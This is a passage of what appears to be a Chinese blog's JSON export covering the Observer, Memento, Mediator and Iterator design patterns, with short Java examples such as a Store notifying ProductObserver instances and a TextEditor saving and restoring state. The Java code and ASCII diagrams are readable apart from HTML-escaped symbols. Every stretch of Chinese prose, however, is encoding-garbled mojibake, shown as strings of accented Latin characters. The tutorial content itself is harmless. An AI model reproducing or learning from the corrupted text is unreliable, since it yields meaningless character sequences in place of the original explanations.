è§‚å¯Ÿè€…æ¨¡å¼ï¼ˆObserverï¼‰åˆç§°å‘å¸ƒ-è®¢é˜…æ¨¡å¼ï¼ˆPublish-Subscribeï¼šPub/Subï¼‰ã€‚å®ƒæ˜¯ä¸€ç§é€šçŸ¥æœºåˆ¶ï¼Œè®©å‘é€é€šçŸ¥çš„ä¸€æ–¹ï¼ˆè¢«è§‚å¯Ÿæ–¹ï¼‰å’Œæ¥æ”¶é€šçŸ¥çš„ä¸€æ–¹ï¼ˆè§‚å¯Ÿè€…ï¼‰èƒ½å½¼æ­¤åˆ†ç¦»ï¼Œäº’ä¸å½±å“ã€‚ è¦ç†è§£è§‚å¯Ÿè€…æ¨¡å¼ï¼Œæˆ‘ä»¬è¿˜æ˜¯çœ‹ä¾‹å­ã€‚ å‡è®¾ä¸€ä¸ªç”µå•†ç½‘ç«™ï¼Œæœ‰å¤šç§Productï¼ˆå•†å“ï¼‰ï¼ŒåŒæ—¶ï¼ŒCustomerï¼ˆæ¶ˆè´¹è€…ï¼‰å’ŒAdminï¼ˆç®¡ç†å‘˜ï¼‰å¯¹å•†å“ä¸Šæ¶ã€ä»·æ ¼æ”¹å˜éƒ½æ„Ÿå…´è¶£ï¼Œå¸Œæœ›èƒ½ç¬¬ä¸€æ—¶é—´è·å¾—é€šçŸ¥ã€‚äºæ˜¯ï¼ŒStoreï¼ˆå•†åœºï¼‰å¯ä»¥è¿™ä¹ˆå†™ï¼š public class Store { Customer customer; Admin admin; private Map&lt;String, Product&gt; products = new HashMap&lt;&gt;(); public void addNewProduct(String name, double price) { Product p = new Product(name, price); products.put(p.getName(), p); // é€šçŸ¥ç”¨æˆ·: customer.onPublished(p); // é€šçŸ¥ç®¡ç†å‘˜: admin.onPublished(p); } public void setProductPrice(String name, double price) { Product p = products.get(name); p.setPrice(price); // é€šçŸ¥ç”¨æˆ·: customer.onPriceChanged(p); // é€šçŸ¥ç®¡ç†å‘˜: admin.onPriceChanged(p); } } æˆ‘ä»¬è§‚å¯Ÿä¸Šè¿°Storeç±»çš„é—®é¢˜ï¼šå®ƒç›´æ¥å¼•ç”¨äº†Customerå’ŒAdminã€‚å…ˆä¸è€ƒè™‘å¤šä¸ªCustomeræˆ–å¤šä¸ªAdminçš„é—®é¢˜ï¼Œä¸Šè¿°Storeç±»æœ€å¤§çš„é—®é¢˜æ˜¯ï¼Œå¦‚æœè¦åŠ ä¸€ä¸ªæ–°çš„è§‚å¯Ÿè€…ç±»å‹ï¼Œä¾‹å¦‚å·¥å•†å±€ç®¡ç†å‘˜ï¼ŒStoreç±»å°±å¿…é¡»ç»§ç»­æ”¹åŠ¨ã€‚ å› æ­¤ï¼Œä¸Šè¿°é—®é¢˜çš„æœ¬è´¨æ˜¯Storeå¸Œæœ›å‘é€é€šçŸ¥ç»™é‚£äº›å…³å¿ƒProductçš„å¯¹è±¡ï¼Œä½†Storeå¹¶ä¸æƒ³çŸ¥é“è¿™äº›äººæ˜¯è°ã€‚è§‚å¯Ÿè€…æ¨¡å¼å°±æ˜¯è¦åˆ†ç¦»è¢«è§‚å¯Ÿè€…å’Œè§‚å¯Ÿè€…ä¹‹é—´çš„è€¦åˆå…³ç³»ã€‚ è¦å®ç°è¿™ä¸€ç›®æ ‡ä¹Ÿå¾ˆç®€å•ï¼ŒStoreä¸èƒ½ç›´æ¥å¼•ç”¨Customerå’ŒAdminï¼Œç›¸åï¼Œå®ƒå¼•ç”¨ä¸€ä¸ªProductObserveræ¥å£ï¼Œä»»ä½•äººæƒ³è¦è§‚å¯ŸStoreï¼Œåªè¦å®ç°è¯¥æ¥å£ï¼Œå¹¶ä¸”æŠŠè‡ªå·±æ³¨å†Œåˆ°Storeå³å¯ï¼š public class Store { private List&lt;ProductObserver&gt; observers = new ArrayList&lt;&gt;(); private Map&lt;String, Product&gt; products = new HashMap&lt;&gt;(); // æ³¨å†Œè§‚å¯Ÿè€…: public void addObserver(ProductObserver observer) { this.observers.add(observer); } // å–æ¶ˆæ³¨å†Œ: public void removeObserver(ProductObserver observer) { this.observers.remove(observer); } public void addNewProduct(String name, double price) { Product p = new Product(name, price); products.put(p.getName(), p); // é€šçŸ¥è§‚å¯Ÿè€…: observers.forEach(o -&gt; o.onPublished(p)); } public void setProductPrice(String name, double price) { Product p = products.get(name); p.setPrice(price); // é€šçŸ¥è§‚å¯Ÿè€…: observers.forEach(o -&gt; o.onPriceChanged(p)); } } å°±æ˜¯è¿™ä¹ˆä¸€ä¸ªå°å°çš„æ”¹åŠ¨ï¼Œä½¿å¾—è§‚å¯Ÿè€…ç±»å‹å°±å¯ä»¥æ— é™æ‰©å……ï¼Œè€Œä¸”ï¼Œè§‚å¯Ÿè€…çš„å®šä¹‰å¯ä»¥æ”¾åˆ°å®¢æˆ·ç«¯ï¼š // observer: Admin a = new Admin(); Customer c = new Customer(); // store: Store store = new Store(); // æ³¨å†Œè§‚å¯Ÿè€…: store.addObserver(a); store.addObserver(c); ç”šè‡³å¯ä»¥æ³¨å†ŒåŒ¿åè§‚å¯Ÿè€…ï¼š store.addObserver(new ProductObserver() { public void onPublished(Product product) { System.out.println(&quot;[Log] on product published: &quot; + product); } public void onPriceChanged(Product product) { System.out.println(&quot;[Log] on product price changed: &quot; + product); } }); ç”¨ä¸€å¼ å›¾ç”»å‡ºè§‚å¯Ÿè€…æ¨¡å¼ï¼š â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ Store â”‚â”€ â”€ â”€&gt;â”‚ProductObserverâ”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â–² â”‚ â”‚ â”Œâ”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â” â–¼ â”‚ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ Product â”‚ â”‚ Admin â”‚ â”‚Customer â”‚ ... â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ è§‚å¯Ÿè€…æ¨¡å¼ä¹Ÿæœ‰å¾ˆå¤šå˜ä½“å½¢å¼ã€‚æœ‰çš„è§‚å¯Ÿè€…æ¨¡å¼æŠŠè¢«è§‚å¯Ÿè€…ä¹ŸæŠ½è±¡å‡ºæ¥å£ï¼š public interface ProductObservable { // æ³¨æ„æ­¤å¤„æ‹¼å†™æ˜¯Observableä¸æ˜¯Observer! void addObserver(ProductObserver observer); void removeObserver(ProductObserver observer); } å¯¹åº”çš„å®ä½“è¢«è§‚å¯Ÿè€…å°±è¦å®ç°è¯¥æ¥å£ï¼š public class Store implements ProductObservable { ... } æœ‰äº›è§‚å¯Ÿè€…æ¨¡å¼æŠŠé€šçŸ¥å˜æˆä¸€ä¸ªEventå¯¹è±¡ï¼Œä»è€Œä¸å†æœ‰å¤šç§æ–¹æ³•é€šçŸ¥ï¼Œè€Œæ˜¯ç»Ÿä¸€æˆä¸€ç§ï¼š public interface ProductObserver { void onEvent(ProductEvent event); } è®©è§‚å¯Ÿè€…è‡ªå·±ä»Eventå¯¹è±¡ä¸­è¯»å–é€šçŸ¥ç±»å‹å’Œé€šçŸ¥æ•°æ®ã€‚ å¹¿ä¹‰çš„è§‚å¯Ÿè€…æ¨¡å¼åŒ…æ‹¬æ‰€æœ‰æ¶ˆæ¯ç³»ç»Ÿã€‚æ‰€è°“æ¶ˆæ¯ç³»ç»Ÿï¼Œå°±æ˜¯æŠŠè§‚å¯Ÿè€…å’Œè¢«è§‚å¯Ÿè€…å®Œå…¨åˆ†ç¦»ï¼Œé€šè¿‡æ¶ˆæ¯ç³»ç»Ÿæœ¬èº«æ¥é€šçŸ¥ï¼š â”Œ â”€ â”€ â”€ â”€ â”€ â”€ â”€ â”€ â”€ â”€ â”€ â” Messaging System â”‚ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”¼&gt;â”‚Topic:newProduct â”‚â”€â”€â”¼â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”œâ”€â”€â”€&gt;â”‚ConsumerAâ”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚Producer â”‚â”€â”€â”€â”¼â”€â”€â”€&gt;â”‚Topic:priceChangedâ”‚â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â””â”€â”€â”¼&gt;â”‚Topic:soldOut â”‚â”€â”€â”¼â”€â”€â”€â”€â”€&gt;â”‚ConsumerBâ”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”” â”€ â”€ â”€ â”€ â”€ â”€ â”€ â”€ â”€ â”€ â”€ â”˜ æ¶ˆæ¯å‘é€æ–¹ç§°ä¸ºProducerï¼Œæ¶ˆæ¯æ¥æ”¶æ–¹ç§°ä¸ºConsumerï¼ŒProducerå‘é€æ¶ˆæ¯çš„æ—¶å€™ï¼Œå¿…é¡»é€‰æ‹©å‘é€åˆ°å“ªä¸ªTopicã€‚Consumerå¯ä»¥è®¢é˜…è‡ªå·±æ„Ÿå…´è¶£çš„Topicï¼Œä»è€Œåªè·å¾—ç‰¹å®šç±»å‹çš„æ¶ˆæ¯ã€‚ ä½¿ç”¨æ¶ˆæ¯ç³»ç»Ÿå®ç°è§‚å¯Ÿè€…æ¨¡å¼æ—¶ï¼ŒProducerå’ŒConsumerç”šè‡³ç»å¸¸ä¸åœ¨åŒä¸€å°æœºå™¨ä¸Šï¼Œå¹¶ä¸”åŒæ–¹å¯¹å¯¹æ–¹å®Œå…¨ä¸€æ— æ‰€çŸ¥ï¼Œå› ä¸ºæ³¨å†Œè§‚å¯Ÿè€…è¿™ä¸ªåŠ¨ä½œæœ¬èº«éƒ½åœ¨æ¶ˆæ¯ç³»ç»Ÿä¸­å®Œæˆï¼Œè€Œä¸æ˜¯åœ¨Producerå†…éƒ¨å®Œæˆã€‚ æ­¤å¤–ï¼Œæ³¨æ„åˆ°æˆ‘ä»¬åœ¨ç¼–å†™è§‚å¯Ÿè€…æ¨¡å¼çš„æ—¶å€™ï¼Œé€šçŸ¥Observeræ˜¯ä¾é è¯­å¥ï¼š observers.forEach(o -&gt; o.onPublished(p)); è¿™è¯´æ˜å„ä¸ªè§‚å¯Ÿè€…æ˜¯ä¾æ¬¡è·å¾—çš„åŒæ­¥é€šçŸ¥ï¼Œå¦‚æœä¸Šä¸€ä¸ªè§‚å¯Ÿè€…å¤„ç†å¤ªæ…¢ï¼Œä¼šå¯¼è‡´ä¸‹ä¸€ä¸ªè§‚å¯Ÿè€…ä¸èƒ½åŠæ—¶è·å¾—é€šçŸ¥ã€‚æ­¤å¤–ï¼Œå¦‚æœè§‚å¯Ÿè€…åœ¨å¤„ç†é€šçŸ¥çš„æ—¶å€™ï¼Œå‘ç”Ÿäº†å¼‚å¸¸ï¼Œè¿˜éœ€è¦è¢«è§‚å¯Ÿè€…å¤„ç†å¼‚å¸¸ï¼Œæ‰èƒ½ä¿è¯ç»§ç»­é€šçŸ¥ä¸‹ä¸€ä¸ªè§‚å¯Ÿè€…ã€‚ æ€è€ƒï¼šå¦‚ä½•æ”¹æˆå¼‚æ­¥é€šçŸ¥ï¼Œä½¿å¾—æ‰€æœ‰è§‚å¯Ÿè€…å¯ä»¥å¹¶å‘åŒæ—¶å¤„ç†ï¼Ÿ æœ‰çš„ç«¥é‹å¯èƒ½å‘ç°Javaæ ‡å‡†åº“æœ‰ä¸ªjava.util.Observableç±»å’Œä¸€ä¸ªObserveræ¥å£ï¼Œç”¨æ¥å¸®åŠ©æˆ‘ä»¬å®ç°è§‚å¯Ÿè€…æ¨¡å¼ã€‚ä½†æ˜¯ï¼Œè¿™ä¸ªç±»éå¸¸ä¸ï¼å¥½ï¼ç”¨ï¼å®ç°è§‚å¯Ÿè€…æ¨¡å¼çš„æ—¶å€™ï¼Œä¹Ÿä¸æ¨èå€ŸåŠ©è¿™ä¸¤ä¸ªä¸œä¸œã€‚","categories":[],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://blog.kayleh.top/tags/DesignPatterns/"}]},{"title":"memo-mode","slug":"å¤‡å¿˜å½•æ¨¡å¼","date":"2020-06-12T23:20:47.000Z","updated":"2021-04-11T17:11:28.831Z","comments":true,"path":"å¤‡å¿˜å½•æ¨¡å¼/","link":"","permalink":"https://blog.kayleh.top/%E5%A4%87%E5%BF%98%E5%BD%95%E6%A8%A1%E5%BC%8F/","excerpt":"å¤‡å¿˜å½•æ¨¡å¼ åœ¨ä¸ç ´åå°è£…æ€§çš„å‰æä¸‹ï¼Œæ•è·ä¸€ä¸ªå¯¹è±¡çš„å†…éƒ¨çŠ¶æ€ï¼Œå¹¶åœ¨è¯¥å¯¹è±¡ä¹‹å¤–ä¿å­˜è¿™ä¸ªçŠ¶æ€ã€‚","text":"å¤‡å¿˜å½•æ¨¡å¼ åœ¨ä¸ç ´åå°è£…æ€§çš„å‰æä¸‹ï¼Œæ•è·ä¸€ä¸ªå¯¹è±¡çš„å†…éƒ¨çŠ¶æ€ï¼Œå¹¶åœ¨è¯¥å¯¹è±¡ä¹‹å¤–ä¿å­˜è¿™ä¸ªçŠ¶æ€ã€‚ å¤‡å¿˜å½•æ¨¡å¼ï¼ˆMementoï¼‰ï¼Œä¸»è¦ç”¨äºæ•è·ä¸€ä¸ªå¯¹è±¡çš„å†…éƒ¨çŠ¶æ€ï¼Œä»¥ä¾¿åœ¨å°†æ¥çš„æŸä¸ªæ—¶å€™æ¢å¤æ­¤çŠ¶æ€ã€‚ å…¶å®æˆ‘ä»¬ä½¿ç”¨çš„å‡ ä¹æ‰€æœ‰è½¯ä»¶éƒ½ç”¨åˆ°äº†å¤‡å¿˜å½•æ¨¡å¼ã€‚æœ€ç®€å•çš„å¤‡å¿˜å½•æ¨¡å¼å°±æ˜¯ä¿å­˜åˆ°æ–‡ä»¶ï¼Œæ‰“å¼€æ–‡ä»¶ã€‚å¯¹äºæ–‡æœ¬ç¼–è¾‘å™¨æ¥è¯´ï¼Œä¿å­˜å°±æ˜¯æŠŠTextEditorç±»çš„å­—ç¬¦ä¸²å­˜å‚¨åˆ°æ–‡ä»¶ï¼Œæ‰“å¼€å°±æ˜¯æ¢å¤TextEditorç±»çš„çŠ¶æ€ã€‚å¯¹äºå›¾åƒç¼–è¾‘å™¨æ¥è¯´ï¼ŒåŸç†æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯ä¿å­˜å’Œæ¢å¤çš„æ•°æ®æ ¼å¼æ¯”è¾ƒå¤æ‚è€Œå·²ã€‚Javaçš„åºåˆ—åŒ–ä¹Ÿå¯ä»¥çœ‹ä½œæ˜¯å¤‡å¿˜å½•æ¨¡å¼ã€‚ åœ¨ä½¿ç”¨æ–‡æœ¬ç¼–è¾‘å™¨çš„æ—¶å€™ï¼Œæˆ‘ä»¬è¿˜ç»å¸¸ä½¿ç”¨Undoã€Redoè¿™äº›åŠŸèƒ½ã€‚è¿™äº›å…¶å®ä¹Ÿå¯ä»¥ç”¨å¤‡å¿˜å½•æ¨¡å¼å®ç°ï¼Œå³ä¸å®šæœŸåœ°æŠŠTextEditorç±»çš„å­—ç¬¦ä¸²å¤åˆ¶ä¸€ä»½å­˜èµ·æ¥ï¼Œè¿™æ ·å°±å¯ä»¥Undoæˆ–Redoã€‚ æ ‡å‡†çš„å¤‡å¿˜å½•æ¨¡å¼æœ‰è¿™ä¹ˆå‡ ç§è§’è‰²ï¼š Memontoï¼šå­˜å‚¨çš„å†…éƒ¨çŠ¶æ€ï¼› Originatorï¼šåˆ›å»ºä¸€ä¸ªå¤‡å¿˜å½•å¹¶è®¾ç½®å…¶çŠ¶æ€ï¼› Caretakerï¼šè´Ÿè´£ä¿å­˜å¤‡å¿˜å½•ã€‚ å®é™…ä¸Šæˆ‘ä»¬åœ¨ä½¿ç”¨å¤‡å¿˜å½•æ¨¡å¼çš„æ—¶å€™ï¼Œä¸å¿…è®¾è®¡å¾—è¿™ä¹ˆå¤æ‚ï¼Œåªéœ€è¦å¯¹ç±»ä¼¼TextEditorçš„ç±»ï¼Œå¢åŠ getState()å’ŒsetState()å°±å¯ä»¥äº†ã€‚ æˆ‘ä»¬ä»¥ä¸€ä¸ªæ–‡æœ¬ç¼–è¾‘å™¨TextEditorä¸ºä¾‹ï¼Œå®ƒå†…éƒ¨ä½¿ç”¨StringBuilderå…è®¸ç”¨æˆ·å¢åˆ å­—ç¬¦ï¼š public class TextEditor { private StringBuilder buffer = new StringBuilder(); public void add(char ch) { buffer.append(ch); } public void add(String s) { buffer.append(s); } public void delete() { if (buffer.length() &gt; 0) { buffer.deleteCharAt(buffer.length() - 1); } } } ä¸ºäº†æ”¯æŒè¿™ä¸ªTextEditorèƒ½ä¿å­˜å’Œæ¢å¤çŠ¶æ€ï¼Œæˆ‘ä»¬å¢åŠ getState()å’ŒsetState()ä¸¤ä¸ªæ–¹æ³•ï¼š public class TextEditor { ... // è·å–çŠ¶æ€: public String getState() { return buffer.toString(); } // æ¢å¤çŠ¶æ€: public void setState(String state) { this.buffer.delete(0, this.buffer.length()); this.buffer.append(state); } } å¯¹è¿™ä¸ªç®€å•çš„æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œç”¨ä¸€ä¸ªStringå°±å¯ä»¥è¡¨ç¤ºå…¶çŠ¶æ€ï¼Œå¯¹äºå¤æ‚çš„å¯¹è±¡æ¨¡å‹ï¼Œé€šå¸¸æˆ‘ä»¬ä¼šä½¿ç”¨JSONã€XMLç­‰å¤æ‚æ ¼å¼ã€‚","categories":[],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://blog.kayleh.top/tags/DesignPatterns/"}]},{"title":"ä¸­ä»‹è€…æ¨¡å¼","slug":"ä¸­ä»‹è€…æ¨¡å¼","date":"2020-06-12T22:46:55.000Z","updated":"2021-04-11T17:11:28.556Z","comments":true,"path":"ä¸­ä»‹è€…æ¨¡å¼/","link":"","permalink":"https://blog.kayleh.top/%E4%B8%AD%E4%BB%8B%E8%80%85%E6%A8%A1%E5%BC%8F/","excerpt":"ä¸­ä»‹è€…æ¨¡å¼ ä¸­ä»‹è€…æ¨¡å¼ï¼ˆMediator Patternï¼‰æ˜¯ç”¨æ¥é™ä½å¤šä¸ªå¯¹è±¡å’Œç±»ä¹‹é—´çš„é€šä¿¡å¤æ‚æ€§ã€‚è¿™ç§æ¨¡å¼æä¾›äº†ä¸€ä¸ªä¸­ä»‹ç±»ï¼Œè¯¥ç±»é€šå¸¸å¤„ç†ä¸åŒç±»ä¹‹é—´çš„é€šä¿¡ï¼Œå¹¶æ”¯æŒæ¾è€¦åˆï¼Œä½¿ä»£ç æ˜“äºç»´æŠ¤ã€‚ä¸­ä»‹è€…æ¨¡å¼å±äºè¡Œä¸ºå‹æ¨¡å¼ã€‚","text":"ä¸­ä»‹è€…æ¨¡å¼ ä¸­ä»‹è€…æ¨¡å¼ï¼ˆMediator Patternï¼‰æ˜¯ç”¨æ¥é™ä½å¤šä¸ªå¯¹è±¡å’Œç±»ä¹‹é—´çš„é€šä¿¡å¤æ‚æ€§ã€‚è¿™ç§æ¨¡å¼æä¾›äº†ä¸€ä¸ªä¸­ä»‹ç±»ï¼Œè¯¥ç±»é€šå¸¸å¤„ç†ä¸åŒç±»ä¹‹é—´çš„é€šä¿¡ï¼Œå¹¶æ”¯æŒæ¾è€¦åˆï¼Œä½¿ä»£ç æ˜“äºç»´æŠ¤ã€‚ä¸­ä»‹è€…æ¨¡å¼å±äºè¡Œä¸ºå‹æ¨¡å¼ã€‚ ä»‹ç»æ„å›¾ï¼šç”¨ä¸€ä¸ªä¸­ä»‹å¯¹è±¡æ¥å°è£…ä¸€ç³»åˆ—çš„å¯¹è±¡äº¤äº’ï¼Œä¸­ä»‹è€…ä½¿å„å¯¹è±¡ä¸éœ€è¦æ˜¾å¼åœ°ç›¸äº’å¼•ç”¨ï¼Œä»è€Œä½¿å…¶è€¦åˆæ¾æ•£ï¼Œè€Œä¸”å¯ä»¥ç‹¬ç«‹åœ°æ”¹å˜å®ƒä»¬ä¹‹é—´çš„äº¤äº’ã€‚ ä¸»è¦è§£å†³ï¼šå¯¹è±¡ä¸å¯¹è±¡ä¹‹é—´å­˜åœ¨å¤§é‡çš„å…³è”å…³ç³»ï¼Œè¿™æ ·åŠ¿å¿…ä¼šå¯¼è‡´ç³»ç»Ÿçš„ç»“æ„å˜å¾—å¾ˆå¤æ‚ï¼ŒåŒæ—¶è‹¥ä¸€ä¸ªå¯¹è±¡å‘ç”Ÿæ”¹å˜ï¼Œæˆ‘ä»¬ä¹Ÿéœ€è¦è·Ÿè¸ªä¸ä¹‹ç›¸å…³è”çš„å¯¹è±¡ï¼ŒåŒæ—¶åšå‡ºç›¸åº”çš„å¤„ç†ã€‚ ä½•æ—¶ä½¿ç”¨ï¼šå¤šä¸ªç±»ç›¸äº’è€¦åˆï¼Œå½¢æˆäº†ç½‘çŠ¶ç»“æ„ã€‚ å¦‚ä½•è§£å†³ï¼šå°†ä¸Šè¿°ç½‘çŠ¶ç»“æ„åˆ†ç¦»ä¸ºæ˜Ÿå‹ç»“æ„ã€‚ å…³é”®ä»£ç ï¼šå¯¹è±¡ Colleague ä¹‹é—´çš„é€šä¿¡å°è£…åˆ°ä¸€ä¸ªç±»ä¸­å•ç‹¬å¤„ç†ã€‚ åº”ç”¨å®ä¾‹ï¼š 1ã€ä¸­å›½åŠ å…¥ WTO ä¹‹å‰æ˜¯å„ä¸ªå›½å®¶ç›¸äº’è´¸æ˜“ï¼Œç»“æ„å¤æ‚ï¼Œç°åœ¨æ˜¯å„ä¸ªå›½å®¶é€šè¿‡ WTO æ¥äº’ç›¸è´¸æ˜“ã€‚ 2ã€æœºåœºè°ƒåº¦ç³»ç»Ÿã€‚ 3ã€MVC æ¡†æ¶ï¼Œå…¶ä¸­Cï¼ˆæ§åˆ¶å™¨ï¼‰å°±æ˜¯ Mï¼ˆæ¨¡å‹ï¼‰å’Œ Vï¼ˆè§†å›¾ï¼‰çš„ä¸­ä»‹è€…ã€‚ ä¼˜ç‚¹ï¼š 1ã€é™ä½äº†ç±»çš„å¤æ‚åº¦ï¼Œå°†ä¸€å¯¹å¤šè½¬åŒ–æˆäº†ä¸€å¯¹ä¸€ã€‚ 2ã€å„ä¸ªç±»ä¹‹é—´çš„è§£è€¦ã€‚ 3ã€ç¬¦åˆè¿ªç±³ç‰¹åŸåˆ™ã€‚ ç¼ºç‚¹ï¼šä¸­ä»‹è€…ä¼šåºå¤§ï¼Œå˜å¾—å¤æ‚éš¾ä»¥ç»´æŠ¤ã€‚ ä½¿ç”¨åœºæ™¯ï¼š 1ã€ç³»ç»Ÿä¸­å¯¹è±¡ä¹‹é—´å­˜åœ¨æ¯”è¾ƒå¤æ‚çš„å¼•ç”¨å…³ç³»ï¼Œå¯¼è‡´å®ƒä»¬ä¹‹é—´çš„ä¾èµ–å…³ç³»ç»“æ„æ··ä¹±è€Œä¸”éš¾ä»¥å¤ç”¨è¯¥å¯¹è±¡ã€‚ 2ã€æƒ³é€šè¿‡ä¸€ä¸ªä¸­é—´ç±»æ¥å°è£…å¤šä¸ªç±»ä¸­çš„è¡Œä¸ºï¼Œè€Œåˆä¸æƒ³ç”Ÿæˆå¤ªå¤šçš„å­ç±»ã€‚ æ³¨æ„äº‹é¡¹ï¼šä¸åº”å½“åœ¨èŒè´£æ··ä¹±çš„æ—¶å€™ä½¿ç”¨ã€‚ å®ç°æˆ‘ä»¬é€šè¿‡èŠå¤©å®¤å®ä¾‹æ¥æ¼”ç¤ºä¸­ä»‹è€…æ¨¡å¼ã€‚å®ä¾‹ä¸­ï¼Œå¤šä¸ªç”¨æˆ·å¯ä»¥å‘èŠå¤©å®¤å‘é€æ¶ˆæ¯ï¼ŒèŠå¤©å®¤å‘æ‰€æœ‰çš„ç”¨æˆ·æ˜¾ç¤ºæ¶ˆæ¯ã€‚æˆ‘ä»¬å°†åˆ›å»ºä¸¤ä¸ªç±» ChatRoom å’Œ Userã€‚User å¯¹è±¡ä½¿ç”¨ ChatRoom æ–¹æ³•æ¥åˆ†äº«ä»–ä»¬çš„æ¶ˆæ¯ã€‚ MediatorPatternDemoï¼Œæˆ‘ä»¬çš„æ¼”ç¤ºç±»ä½¿ç”¨ User å¯¹è±¡æ¥æ˜¾ç¤ºä»–ä»¬ä¹‹é—´çš„é€šä¿¡ã€‚ ä¸­ä»‹è€…æ¨¡å¼çš„ UML å›¾ æ­¥éª¤ 1åˆ›å»ºä¸­ä»‹ç±»ã€‚ ChatRoom.java img æ­¥éª¤ 2åˆ›å»º user ç±»ã€‚ User.java img æ­¥éª¤ 3ä½¿ç”¨ User å¯¹è±¡æ¥æ˜¾ç¤ºä»–ä»¬ä¹‹é—´çš„é€šä¿¡ã€‚ MediatorPatternDemo.java img æ­¥éª¤ 4æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š Thu Jan 31 16:05:46 IST 2013 [Robert] : Hi! John! Thu Jan 31 16:05:46 IST 2013 [John] : Hello! Robert!","categories":[{"name":"è®¾è®¡æ¨¡å¼","slug":"è®¾è®¡æ¨¡å¼","permalink":"https://blog.kayleh.top/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://blog.kayleh.top/tags/DesignPatterns/"}]},{"title":"è¿­ä»£å™¨æ¨¡å¼","slug":"è¿­ä»£å™¨æ¨¡å¼","date":"2020-06-12T21:26:48.000Z","updated":"2021-04-11T17:11:29.064Z","comments":true,"path":"è¿­ä»£å™¨æ¨¡å¼/","link":"","permalink":"https://blog.kayleh.top/%E8%BF%AD%E4%BB%A3%E5%99%A8%E6%A8%A1%E5%BC%8F/","excerpt":"è¿­ä»£å™¨ æä¾›ä¸€ç§æ–¹æ³•é¡ºåºè®¿é—®ä¸€ä¸ªèšåˆå¯¹è±¡ä¸­çš„å„ä¸ªå…ƒç´ ï¼Œè€Œåˆä¸éœ€è¦æš´éœ²è¯¥å¯¹è±¡çš„å†…éƒ¨è¡¨ç¤ºã€‚","text":"è¿­ä»£å™¨ æä¾›ä¸€ç§æ–¹æ³•é¡ºåºè®¿é—®ä¸€ä¸ªèšåˆå¯¹è±¡ä¸­çš„å„ä¸ªå…ƒç´ ï¼Œè€Œåˆä¸éœ€è¦æš´éœ²è¯¥å¯¹è±¡çš„å†…éƒ¨è¡¨ç¤ºã€‚ è¿­ä»£å™¨æ¨¡å¼ï¼ˆIteratorï¼‰å®é™…ä¸Šåœ¨Javaçš„é›†åˆç±»ä¸­å·²ç»å¹¿æ³›ä½¿ç”¨äº†ã€‚æˆ‘ä»¬ä»¥Listä¸ºä¾‹ï¼Œè¦éå†ArrayListï¼Œå³ä½¿æˆ‘ä»¬çŸ¥é“å®ƒçš„å†…éƒ¨å­˜å‚¨äº†ä¸€ä¸ªObject[]æ•°ç»„ï¼Œä¹Ÿä¸åº”è¯¥ç›´æ¥ä½¿ç”¨æ•°ç»„ç´¢å¼•å»éå†ï¼Œå› ä¸ºè¿™æ ·éœ€è¦äº†è§£é›†åˆå†…éƒ¨çš„å­˜å‚¨ç»“æ„ã€‚å¦‚æœä½¿ç”¨Iteratoréå†ï¼Œé‚£ä¹ˆï¼ŒArrayListå’ŒLinkedListéƒ½å¯ä»¥ä»¥ä¸€ç§ç»Ÿä¸€çš„æ¥å£æ¥éå†ï¼š List&lt;String&gt; list = ... for (Iterator&lt;String&gt; it = list.iterator(); it.hasNext(); ) { String s = it.next(); } å®é™…ä¸Šï¼Œå› ä¸ºIteratoræ¨¡å¼ååˆ†æœ‰ç”¨ï¼Œå› æ­¤ï¼ŒJavaå…è®¸æˆ‘ä»¬ç›´æ¥æŠŠä»»ä½•æ”¯æŒIteratorçš„é›†åˆå¯¹è±¡ç”¨foreachå¾ªç¯å†™å‡ºæ¥ï¼š List&lt;String&gt; list = ... for (String s : list) { } ç„¶åç”±Javaç¼–è¯‘å™¨å®ŒæˆIteratoræ¨¡å¼çš„æ‰€æœ‰å¾ªç¯ä»£ç ã€‚ 